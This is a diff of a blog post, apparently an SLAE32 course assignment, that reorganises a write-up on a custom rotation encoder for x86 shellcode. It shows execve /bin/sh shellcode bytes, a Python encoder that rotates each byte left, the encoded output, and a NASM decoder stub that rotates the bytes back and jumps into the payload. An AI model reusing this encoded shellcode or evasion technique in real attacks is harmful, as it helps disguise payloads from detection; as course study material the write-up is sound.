@@ -20,17 +20,20 @@ tags:
 ![](/assets/images/SLAE32.png)
 ## Overview
 For my fourth assignment in the SLAE32 course, I created a custom Rotation Encoder.   
-How this works is to encode the payload, it rotates every bit to the left by one. If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1). To decode, all the bits are rotated to the right by one. If there is a low bit, it is moved to the highest bit.  
++ How this works is to encode the payload, it rotates every bit to the left by one. 
+  - If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1).
 #### Encode 
 ![](/assets/images/rotateLeft.png)  
++ To decode, all the bits are rotated to the right by one. 
+  - If there is a low bit, it is moved to the highest bit.  
 #### Decode
 ![](/assets/images/rotateRight.png)   
-## Encrypting the Payload
-The payload used for this example is the `execve` shellcode provided in the SLAE course.  
+
+## Encoding the Payload
+The payload used for this example is the `execve` shellcode; provided in the SLAE course.  
 
 ### Grabbing the Payload Shellcode
-+ To quickly grab the hex from shellcode, I used the method shown in the SLAE course.   
-+ To make it easier, I added it to a shellscript.  
+#### Shellscript for automation
 ```bash
 #!/bin/bash
 # Filename: objdump2hex.sh
@@ -41,20 +44,20 @@ objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file'\
 | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s \
 | sed 's/^/"/' | sed 's/$/"/g'
 ```
++ To quickly grab the hex from shellcode, I used the method shown in the SLAE course.   
++ To make it easier, I added it to a shellscript.  
 
-### Using the Bash Script to get the Shellcode
+#### Using the Script to get the Payload Shellcode
 ```bash
 root@zed# ./objdump2hex.sh execve-stack 
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
 "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
++ Perfect. Now we will need to encode this shellcode using our Python Encoder `rotateLeftEncoder.py`.  
 
-Perfect. Now we will need to encode this shellcode using our Python Encoder `rotateLeftEncoder.py`.  
-+ The new encoded shellcode is output in both the `\x` format and the `0x, ` format.  
-+ As you can see in the top section, all that needs to be done to change the shellcode payload is replace the string in the `shellcode` array.  
+### Encoding the Payload with the Encoder
 
-### Python Encoder
-
+#### Python Encoder
 ```python
 #!/usr/bin/python
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
@@ -80,9 +83,10 @@ print encoded1
 print encoded2
 print 'Len: %d' % len(bytearray(shellcode))
 ```
++ The new encoded shellcode is output in both the `\x` format and the `0x, ` format.  
++ As you can see in the top section, all that needs to be done to change the shellcode payload is replace the string in the `shellcode` array.  
 
-#### Outputting Our Encoded Shellcode
-
+#### Executing the Encoder
 ```bash
 root# python rotateLeftEncoder.py
 \x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e\xc4\xd2\xdc
@@ -92,22 +96,18 @@ root# python rotateLeftEncoder.py
 0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
 0x16,0x9b,0x01
 Len: 25
+# Add 0xff to the end of the payload
 ```
-
-+ Our encoded shellcode payload is 25 bytes. 
-+ We will need to add a final byte to the end `\xff`.  
++ Our encoded shellcode payload is `25 bytes`. 
++ We will need to add a final byte to the end `0xff`.  
   - This byte will be used by our decoder to let it know it has reached the end of our payload.  
++ We will copy the second output with the `0x, ` format, to our nasm program after appending the byte.  
 
-We will copy the second output with the "0x, " format to our nasm program after appending the byte.  
+## Decoding the Payload
++ This assembly program will use the `JMP|Call|POP` technique to put the memory location of our encoded string into the ESI Register.
++ Once in the ESI Register, we will decode our payload byte-by-byte.
 
-This assembly program will use the Jump-Call-Pop technique to save the memory location of our string to the stack and then pop that address into the ESI Register.   Once in the ESI Register, we will decode our encoded shellcode byte-by-byte, using the instructions `ror byte [esi], 1` and `inc esi`. 
-+ `ror byte [esi], 1` 
-  - rotate to the right one bit, one byte at a time, 
-+ If the decoded byte is `\xff` then we will jump to the shellcode using the instruction `je Shellcode`.  
-+ If the byte is not `\xff` then the zero flag will not be set, and that jump will be ignored.   
-
-The next instruction `jmp short decode` is an unconditional jump. We use this to create the loop to decode our shellcode.  
-
+#### The Decoder
 ```nasm
 ; Filename: rotateRightDecoder.nasm
 ; Author:   boku
@@ -116,25 +116,30 @@ global _start
 
 section .text
 _start:
-  jmp short call_decoder
+  jmp short call_decoder ; 1. jump to where the shellcode string is
 
-decoder:
-  pop esi
+decoder: 
+  pop esi                ; 3. Put string location in esi register
 
 decode:
-  ror byte [esi], 1
-  cmp byte [esi], 0xFF
-  je Shellcode
-  inc esi
-  jmp short decode
+  ror byte [esi], 1      ; 4. decode the byte by bitwise rotate right
+  cmp byte [esi], 0xFF   ; 5. Is this the last byte?
+  je Shellcode           ;    - If so jump into the payload and execute
+  inc esi                ; 6. Not end? Move forward 1 byte
+  jmp short decode       ; 7. Lets decode the next byte
         
 call_decoder:
-  call decoder
+  call decoder           ; 2. Put the mem location of the string on the stack
   Shellcode: db 0x62,0x81,0xa0,0xd0,0x5e,0x5e,\
       0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,\
       0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
       0x16,0x9b,0x01,0xff
 ```
++ The instruction `jmp short decode` is an unconditional jump. We use this to create the loop to decode our shellcode.  
++ `ror byte [esi], 1` 
+  - rotate to the right one bit, one byte at a time, 
++ If the decoded byte is `\xff` then we will jump to the shellcode using the instruction `je Shellcode`.
++ If the byte is not `\xff` then the zero flag will not be set, and that jump will be ignored.   
 + Now that both the decoder and encoder are created, the last thing to do is compile and test.  
 
 # Testing the Decoder
